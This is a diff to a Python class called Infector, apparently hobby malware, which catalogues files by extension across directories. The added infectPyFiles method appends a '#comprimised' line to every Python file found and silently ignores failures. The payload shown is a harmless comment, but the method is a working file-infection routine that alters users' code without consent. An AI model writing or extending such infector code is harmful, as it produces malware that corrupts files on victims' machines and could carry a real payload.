@@ -15,6 +15,13 @@ class Infector:
                     print("File found: " + files[0] + "\\" + file + "\n")
                     filesFound.append(files[0] + "\\" + file)
                     self.files[extension.lower()] = filesFound
+    
+    def getTotalNumberOfFiles(self):
+        total = 0
+        for key in self.files:
+            total += len(self.files[key])
+        self.files['total'] = str(total)
+        return total
 
     def searchVulnerableFileNames(self):
         temp = 0
@@ -54,10 +61,13 @@ class Infector:
                 x = re.findall("(?i)({}):*s*".format(string), sentence)
                 if x != []:
                     print(x)
-
-    def getTotalNumberOfFiles(self):
-        total = 0
-        for key in self.files:
-            total += len(self.files[key])
-        self.files['total'] = str(total)
-        return total
+    
+    def infectPyFiles(self):
+        print(self.files['py'])
+        for file in self.files['py']:
+            try:
+                FH = open(file, "a")
+                FH.write('\n' + '''#comprimised''')
+                FH.close()
+            except:
+                pass
